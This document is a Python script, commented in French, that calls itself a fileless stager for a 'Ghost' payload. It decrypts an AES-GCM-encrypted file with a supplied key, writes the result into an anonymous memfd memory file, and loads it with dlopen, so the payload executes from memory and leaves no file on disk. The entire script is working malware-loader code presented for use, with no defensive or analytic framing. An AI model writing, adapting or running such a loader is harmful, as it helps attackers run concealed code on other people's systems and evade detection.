#!/usr/bin/env python3
import ctypes
import os
import sys
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend

LIBC = ctypes.CDLL("libc.so.6", use_errno=True)
LIBDL = ctypes.CDLL("libdl.so.2", use_errno=True)

MFD_CLOEXEC = 0x0001
SYS_memfd_create = 319
RTLD_NOW = 0x00002
RTLD_GLOBAL = 0x00100

LIBC.syscall.argtypes = [ctypes.c_long, ctypes.c_long, ctypes.c_long, ctypes.c_long]
LIBC.syscall.restype = ctypes.c_long
LIBC.write.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t]
LIBC.write.restype = ctypes.c_ssize_t
LIBC.close.argtypes = [ctypes.c_int]
LIBC.close.restype = ctypes.c_int
LIBDL.dlopen.argtypes = [ctypes.c_char_p, ctypes.c_int]
LIBDL.dlopen.restype = ctypes.c_void_p
LIBDL.dlerror.restype = ctypes.c_char_p


def run_fileless(decrypted_data):
    name = b"ghost"
    fd = LIBC.syscall(
        SYS_memfd_create,
        ctypes.c_char_p(name),
        ctypes.c_int(MFD_CLOEXEC),
    )
    if fd < 0:
        errno = ctypes.get_errno()
        print(f"[-] memfd_create failed: {os.strerror(errno)}")
        return False

    data_len = len(decrypted_data)
    write_result = LIBC.write(fd, decrypted_data, data_len)
    if write_result != data_len:
        errno = ctypes.get_errno()
        print(f"[-] write failed: {os.strerror(errno)}")
        LIBC.close(fd)
        return False

    path = f"/proc/self/fd/{fd}".encode()
    handle = LIBDL.dlopen(path, RTLD_NOW | RTLD_GLOBAL)

    if not handle:
        error = LIBDL.dlerror()
        if error:
            print(f"[-] dlopen error: {error.decode()}")
        LIBC.close(fd)
        return False

    LIBC.close(fd)
    return True


def stage(encrypted_payload_bytes, hex_key):
    if not hex_key or hex_key == "VOTRE_CLE_HEX_ICI":
        print("[-] Erreur: Clé hexadecimale non configuree dans stager.py")
        return False

    try:
        key = bytes.fromhex(hex_key)
    except ValueError:
        print("[-] Erreur: Cle hexadecimale invalide")
        return False

    if len(encrypted_payload_bytes) < 12:
        print("[-] Erreur: Payload trop court (doit contenir nonce + ciphertext)")
        return False

    nonce = encrypted_payload_bytes[:12]
    ciphertext = encrypted_payload_bytes[12:]

    aesgcm = AESGCM(key)

    try:
        decrypted_data = aesgcm.decrypt(nonce, ciphertext, None)
        print("[+] Dechiffrement reussi.")
    except Exception as e:
        print(f"[-] Echec du dechiffrement: {e}")
        return False

    if run_fileless(decrypted_data):
        print("[+] Payload execute depuis la memoire.")
        return True

    return False


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Stager fileless pour Ghost payload")
    parser.add_argument(
        "-p", "--payload", required=True, help="Fichier payload chiffre"
    )
    parser.add_argument(
        "-k", "--key", required=True, help="Cle hexadecimale (32 octets = 64 chars)"
    )
    args = parser.parse_args()

    if not os.path.exists(args.payload):
        print(f"[-] Erreur: Fichier payload introuvable: {args.payload}")
        sys.exit(1)

    with open(args.payload, "rb") as f:
        payload = f.read()

    if stage(payload, args.key):
        print("[+] Succes")
        sys.exit(0)
    else:
        print("[-] Echec")
        sys.exit(1)
